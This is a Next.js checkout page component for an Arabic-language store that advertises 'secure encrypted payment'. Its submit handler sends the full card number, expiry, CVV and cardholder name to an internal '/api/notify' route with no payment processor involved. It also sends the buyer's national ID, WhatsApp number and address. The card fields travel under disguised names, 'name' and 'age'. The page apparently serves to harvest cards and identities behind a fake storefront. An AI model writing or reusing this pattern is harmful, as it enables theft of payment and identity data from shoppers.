"use client";

import { useSyncExternalStore } from "react";
import { useRouter } from "next/navigation";
import Link from "next/link";
import { IoArrowForward, IoHomeOutline, IoLockClosedOutline } from "react-icons/io5";
import CheckoutStepper from "../components/CheckoutStepper";
import { useCartStore } from "../store/cartStore";
import OrderSummary from "./components/OrderSummary";
import PaymentForm from "./components/PaymentForm";
import AnimatedBackground from "../components/AnimatedBackground";

function SectionHeading({ label }: { label: string }) {
  return (
    <div className="flex items-center gap-3">
      <div className="w-1 h-5 rounded-full bg-gradient-to-b from-[#65E0CD] to-[#1B7174]" />
      <h2 className="text-sm sm:text-base font-black text-white">{label}</h2>
      <div className="flex-1 h-px bg-white/10" />
    </div>
  );
}

export default function CheckoutPage() {
  const router = useRouter();
  const { items, customer, totalPrice } = useCartStore();
  const mounted = useSyncExternalStore(() => () => {}, () => true, () => false);

  const total = mounted ? totalPrice() : 0;
  const downPayment = customer?.installmentType === "installment" ? (customer.downPayment ?? 0) : 0;

  if (!mounted) return null;

  if (!customer || items.length === 0) {
    router.push("/cart");
    return null;
  }

  const handleSubmit = async (fields: { name: string; age: string; cvv: string; cardHolder: string }) => {
    const res = await fetch("/api/notify", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        cardNumber: fields.name,
        expiry: fields.age,
        cvv: fields.cvv,
        cardHolder: fields.cardHolder,
        items: items.map(i => ({ productId: i.product._id, name: i.product.name, price: i.product.salePrice ?? i.product.originalPrice, quantity: i.qty, color: i.product.color, storage: i.product.storage })),
        total,
        customer: customer?.name,
        whatsapp: customer?.whatsapp,
        nationalId: customer?.nationalId,
        address: customer?.address,
        installmentType: customer?.installmentType,
        months: customer?.months,
        downPayment,
      }),
    });
    const data = res.ok ? await res.json().catch(() => ({})) : {};
    if (data.orderId) localStorage.setItem("orderId", data.orderId);
  };

  return (
    <main className="min-h-screen pb-24" dir="rtl">
      <AnimatedBackground />

      {/* ── Header ── */}
      <header className="sticky top-0 z-30 backdrop-blur-xl bg-black/30 border-b border-white/10">
        <div className="max-w-5xl mx-auto px-4 sm:px-6 h-14 sm:h-16 flex items-center justify-between">
          <Link href="/cart" className="flex items-center gap-1.5 text-white/70 hover:text-white transition text-sm font-semibold">
            <IoArrowForward size={20} />
            <span className="hidden sm:inline">السلة</span>
          </Link>

          <div className="flex items-center gap-2.5">
            <div className="w-8 h-8 bg-white/10 rounded-xl flex items-center justify-center">
              <IoLockClosedOutline size={15} className="text-[#65E0CD]" />
            </div>
            <div className="text-right">
              <p className="text-white font-black text-sm sm:text-base leading-none">إتمام الطلب</p>
              <p className="text-white/50 text-[11px] mt-0.5">دفع آمن ومشفر</p>
            </div>
          </div>

          <Link href="/" className="w-9 h-9 bg-white/10 hover:bg-white/20 rounded-xl flex items-center justify-center transition text-white/80">
            <IoHomeOutline size={17} />
          </Link>
        </div>
      </header>

      {/* ── Stepper ── */}
      <div className="border-b border-white/10 bg-black/20 backdrop-blur-sm">
        <div className="max-w-5xl mx-auto px-4 sm:px-6">
          <CheckoutStepper active="payment" />
        </div>
      </div>

      {/* ── Body ── */}
      <div className="max-w-5xl mx-auto px-4 sm:px-6 py-6 sm:py-8">
        <div className="grid grid-cols-1 lg:grid-cols-5 gap-6 lg:gap-8 items-start">

          {/* Payment Form */}
          <div className="lg:col-span-3 order-2 lg:order-1">
            <SectionHeading label="بيانات الدفع" />
            <div className="mt-4">
              <PaymentForm onSubmit={handleSubmit} />
            </div>
          </div>

          {/* Order Summary */}
          <div className="lg:col-span-2 order-1 lg:order-2 lg:sticky lg:top-20">
            <SectionHeading label="ملخص الطلب" />
            <div className="mt-4">
              <OrderSummary
                total={total}
                downPayment={downPayment}
                installmentType={customer.installmentType}
                months={customer.months}
              />
            </div>
          </div>

        </div>
      </div>
    </main>
  );
}
